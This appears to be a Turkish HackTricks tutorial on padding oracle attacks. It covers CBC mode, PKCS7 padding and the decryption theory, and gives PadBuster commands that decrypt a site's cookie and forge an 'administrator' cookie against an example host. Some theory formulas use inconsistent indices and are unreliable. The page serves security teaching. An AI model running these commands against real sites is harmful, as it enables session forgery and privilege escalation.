# Dolgu Oracle

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünleri**]'ni edinin (https://peass.creator-spring.com)
* [**PEASS Ailesi**]'ni keşfedin (https://opensea.io/collection/the-peass-family), özel [**NFT'ler**]'imiz koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı göndererek HackTricks** (https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR gönderin.

</details>

## CBC - Cipher Block Chaining

CBC modunda **önceki şifrelenmiş blok IV olarak** kullanılır ve bir sonraki blokla XOR işlemi yapılır:

![https://defuse.ca/images/cbc\_encryption.png](https://defuse.ca/images/cbc\_encryption.png)

CBC'yi şifrelemek için **şifreleme anahtarı** ve **IV** kullanılır.

## Mesaj Dolgusu

Şifreleme **sabit boyutlu bloklarda** gerçekleştirildiği için genellikle **son bloğu tamamlamak için dolgu** gereklidir.\
Genellikle **PKCS7** kullanılır, bu da bloğu tamamlamak için gereken **bayt sayısını tekrarlayan bir dolgu** oluşturur. Örneğin, son blokta 3 bayt eksikse, dolgu `\x03\x03\x03` olacaktır.

**8 baytlık 2 blok** uzunluğundaki daha fazla örneğe bakalım:

| bayt #0 | bayt #1 | bayt #2 | bayt #3 | bayt #4 | bayt #5 | bayt #6 | bayt #7 | bayt #0  | bayt #1  | bayt #2  | bayt #3  | bayt #4  | bayt #5  | bayt #6  | bayt #7  |
| ------- | ------- | ------- | ------- | ------- | ------- | ------- | ------- | -------- | -------- | -------- | -------- | -------- | -------- | -------- | -------- |
| P       | A       | S       | S       | W       | O       | R       | D       | 1        | 2        | 3        | 4        | 5        | 6        | **0x02** | **0x02** |
| P       | A       | S       | S       | W       | O       | R       | D       | 1        | 2        | 3        | 4        | 5        | **0x03** | **0x03** | **0x03** |
| P       | A       | S       | S       | W       | O       | R       | D       | 1        | 2        | 3        | **0x05** | **0x05** | **0x05** | **0x05** | **0x05** |
| P       | A       | S       | S       | W       | O       | R       | D       | **0x08** | **0x08** | **0x08** | **0x08** | **0x08** | **0x08** | **0x08** | **0x08** |

Son örnekte **son bloğun dolu olduğuna** dikkat edin, bu yüzden sadece dolgu ile başka bir blok oluşturuldu.

## Dolgu Oracle

Bir uygulama şifrelenmiş verileri şifre çözme işleminden sonra dolgu kaldırır. Dolgu temizliği sırasında **geçersiz bir dolgu algılanabilir bir davranışı tetiklerse**, bir **dolgu oracle zafiyeti** oluşur. Algılanabilir davranış bir **hata**, **sonuçların eksikliği** veya **daha yavaş bir yanıt** olabilir.

Bu davranışı tespit ederseniz, **şifrelenmiş verileri şifre çözebilir** ve hatta **herhangi bir açık metni şifreleyebilirsiniz**.

### Sömürü Nasıl Yapılır

Bu tür bir zafiyeti sömürmek için [https://github.com/AonCyberLabs/PadBuster](https://github.com/AonCyberLabs/PadBuster) kullanabilir veya sadece yapabilirsiniz
```
sudo apt-get install padbuster
```
Bir sitenin çerezinin savunmasız olup olmadığını test etmek için şunları deneyebilirsiniz:
```bash
perl ./padBuster.pl http://10.10.10.10/index.php "RVJDQrwUdTRWJUVUeBKkEA==" 8 -encoding 0 -cookies "login=RVJDQrwUdTRWJUVUeBKkEA=="
```
**Kodlama 0**, **base64**'ün kullanıldığı anlamına gelir (ancak diğerleri de mevcuttur, yardım menüsünü kontrol edin).

Bu zafiyeti yeni verileri şifrelemek için de **kötüye kullanabilirsiniz. Örneğin, çerezin içeriğinin "**_**user=MyUsername**_**" olduğunu varsayalım, sonra bunu "\_user=administrator\_" olarak değiştirebilir ve uygulama içinde ayrıcalıkları yükseltebilirsiniz. Ayrıca, `-plaintext` parametresini belirterek bunu `paduster` kullanarak da yapabilirsiniz:
```bash
perl ./padBuster.pl http://10.10.10.10/index.php "RVJDQrwUdTRWJUVUeBKkEA==" 8 -encoding 0 -cookies "login=RVJDQrwUdTRWJUVUeBKkEA==" -plaintext "user=administrator"
```
Eğer site savunmasızsa, `padbuster` otomatik olarak dolgu hatası oluştuğunda bulmaya çalışacaktır, ancak ayrıca hata mesajını da **-error** parametresini kullanarak belirtebilirsiniz.
```bash
perl ./padBuster.pl http://10.10.10.10/index.php "" 8 -encoding 0 -cookies "hcon=RVJDQrwUdTRWJUVUeBKkEA==" -error "Invalid padding"
```
### Teori

**Özetle**, farklı **doldurma değerlerini** oluşturmak için doğru değerleri tahmin ederek şifrelenmiş verilerin şifresini çözmeye başlayabilirsiniz. Ardından, doldurma oracle saldırısı, **1, 2, 3 vb. doldurma oluşturan doğru değeri tahmin ederek** baytları baştan sona doğru şifresini çözmeye başlayacaktır.

![](<../.gitbook/assets/image (558).png>)

**E0'dan E15'e** kadar olan baytlar tarafından oluşturulan **2 bloktan** oluşan bazı şifreli metinleriniz olduğunu hayal edin.\
**Son** **bloğu** (**E8** ile **E15** arası) **çözmek** için, tüm blok "blok şifre çözme" işleminden geçer ve **ara baytlar I0'dan I15'e** oluşturur.\
Son olarak, her ara bayt önceki şifrelenmiş baytlarla (E0'dan E7'ye) **XOR** edilir. Yani:

* `C15 = D(E15) ^ E7 = I15 ^ E7`
* `C14 = I14 ^ E6`
* `C13 = I13 ^ E5`
* `C12 = I12 ^ E4`
* ...

Şimdi, `C15`'in `0x01` olduğu **E7**'yi değiştirmek mümkün olacak, bu da doğru bir doldurma olacaktır. Yani, bu durumda: `\x01 = I15 ^ E'7`

Bu yüzden, `E'7` bulunduğunda, **I15 hesaplanabilir**: `I15 = 0x01 ^ E'7`

Bu bize **C15'i hesaplama** olanağı sağlar: `C15 = E7 ^ I15 = E7 ^ \x01 ^ E'7`

**C15** bilindiğinde, şimdi **C14** hesaplanabilir, ancak bu sefer `\x02\x02` doldurması için brute-force yapılması gerekmektedir.

Bu BF, öncekine benzer karmaşıktır çünkü 0x02 değerine sahip `E''15`'i hesaplamak mümkündür: `E''7 = \x02 ^ I15` bu yüzden sadece **`C14`'ü `0x02`'ye eşit olan `E'14`'ü bulmak gerekmektedir.\
Sonra, C14'ü şifrelemek için aynı adımları uygulayın: **`C14 = E6 ^ I14 = E6 ^ \x02 ^ E''6`**

**Tüm şifreli metni çözmek için bu zinciri takip edin.**

### Zafiyetin Tespiti

Bir hesap kaydedin ve bu hesapla oturum açın.\
Eğer **birçok kez oturum açarsanız** ve her zaman **aynı çerez**i alırsanız, uygulamada muhtemelen **bir sorun var** demektir. Geri gönderilen **çerez her seferinde benzersiz olmalıdır**. Eğer çerez **her zaman** **aynı** ise, muhtemelen her zaman geçerli olacak ve **geçersiz kılacak bir yol olmayacaktır**.

Şimdi, **çerezi değiştirmeyi** denerseniz, uygulamadan bir **hata** aldığınızı görebilirsiniz.\
Ancak, doldurmayı BF yaparsanız (örneğin padbuster kullanarak), farklı bir kullanıcı için geçerli başka bir çerez elde edebilirsiniz. Bu senaryo büyük olasılıkla padbuster'a karşı savunmasızdır.

### Referanslar

* [https://en.wikipedia.org/wiki/Block\_cipher\_mode\_of\_operation](https://en.wikipedia.org/wiki/Block\_cipher\_mode\_of\_operation)

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) katılın veya [telegram grubuna](https://t.me/peass) katılın veya** bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek destekleyin.

</details>
